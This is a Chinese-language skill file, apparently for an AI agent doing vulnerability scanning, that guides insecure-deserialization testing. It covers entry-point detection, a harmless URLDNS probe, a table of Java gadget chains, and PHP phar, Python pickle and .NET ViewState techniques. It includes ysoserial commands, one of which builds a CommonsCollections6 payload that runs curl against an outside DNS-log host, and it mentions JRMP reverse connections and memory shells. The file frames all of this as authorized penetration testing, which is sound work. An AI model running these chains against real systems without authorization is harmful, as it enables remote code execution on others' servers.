---
name: hunt-deserialization
description: 反序列化挖掘：判定入口矩阵（cookie/base64/hex/T3/IIOP/ViewState）、Java URLDNS 无害探测→链族选择（CC/CB/C3P0/JDK7u21）、PHP phar、Python pickle、.NET ViewState
whenToUse: 看到 base64/hex 长串参数、Java 中间件端口、PHP cookie、.NET ViewState 时的专项测试
role: vuln-scan
enabled: true
---

# 反序列化挖掘

## 判定入口矩阵（先认入口再选链）

| 入口特征 | 环境 | 首探 |
|---|---|---|
| Cookie rememberMe（deleteMe 回显） | Shiro | 见 framework-shiro 技能（key+URLDNS） |
| POST body 长 base64 以 `rO0AB`（hex `ac ed`）开头 | Java 原生序列化 | URLDNS |
| Content-Type `application/x-java-serialized-object` | JBoss/JMX | URLDNS |
| 7001/7002 端口 T3/IIOP 握手 | Weblogic | 见 framework-weblogic 技能 |
| `__VIEWSTATE` 参数（ASP.NET） | .NET | ViewState 无 MAC 校验判定 |
| PHP cookie/session 里 `O:8:"stdClass"` 形态 | PHP | unserialize 探针 |
| Fastjson/Jackson 的 JSON `@type`/`["class",...]` | JSON 反序列化 | 见 framework-fastjson 技能 |

## Java：URLDNS 无害探测（第一步，永远先做）

```bash
# ysoserial 生成只触发 DNS 的链（零执行）
java -jar ysoserial.jar URLDNS 'http://<token>.<你的dnslog域>/a' > urldns.ser
base64 urldns.ser | tr -d '\n'   # 按入口形态编码（base64/hex/原样 T3 包）
```

回连 ⇒ 目标存在可利用的原生反序列化通道 ⇒ 再按依赖选执行链。**不回连** ⇒ 通道不可达或库被禁，跳过执行链尝试。

## Java 链族速查（按目标 classpath 选）

| 链 | 依赖 | 版本要点 |
|---|---|---|
| CommonsCollections5/6 | commons-collections 3.1 | 最通用；CC4+ 需 CC4 链 |
| CommonsCollections1 | CC3.x + 未开安全模式 | JDK≥8u71 后 TransformerMap 改动失效，换 CC5/6 |
| CommonsBeanutils1 | commons-beanutils（Shiro 环境自带） | 无 CC 依赖时的 Shiro 首选 |
| C3P0 二次反序列化 | c3p0 | 不出网（加载 hex 类） |
| JDK7u21 | 仅 JDK | 无第三方依赖时的救命链 |
| JRE8u20 | 仅 JDK | 7u21 修补后的替代 |
| JRMPClient/Listener | 无 | 反连 ysoserial JRMP 端口的交互通道（授权后用） |

生成后对照：`java -jar ysoserial.jar CommonsCollections6 'curl http://<dnslog>/cc6' > cc6.ser`，同样先 dnslog 证明执行，再谈回显/内存马（授权范围内）。

## 非 Java 快查

- **PHP**：`phar://` 流包装器触发 metadata 反序列化（上传任何文件+文件操作函数即触发）；pop 链看目标框架（Laravel/Yii gadget 链）——首探 `O:8:"stdClass":0:{}` 看报错差异
- **Python**：pickle（`gASV` 开头 base64）——`__reduce__` 直接命令执行；Web 场景少见，见 Flask session 签名伪造链路
- **.NET ViewState**：`<machineKey>` 泄露（web.config 读取/GitHub）→ ysoserial.net 生成 ViewState；无 machineKey 时判 `enableViewStateMac` 配置

## 纪律

- URLDNS/无害探测不需要额外授权理由；**执行链必须在确认授权后**才上，且先 dnslog 证明再谈利用
- Weblogic/T3 的破坏性利用（如老 CVE 的堆破坏）可能打挂服务——生产目标先确认可接受性
- 回填：category=deserialization，content 记"入口→链→依赖判定→证据"

<!-- 改编自: PayloadsAllTheThings(Insecure Deserialization) + GrrrDog/Java-Deserialization-Cheat-Sheet + welk1n/JNDI-Injection-Exploit 文档, 2026-10-31 -->
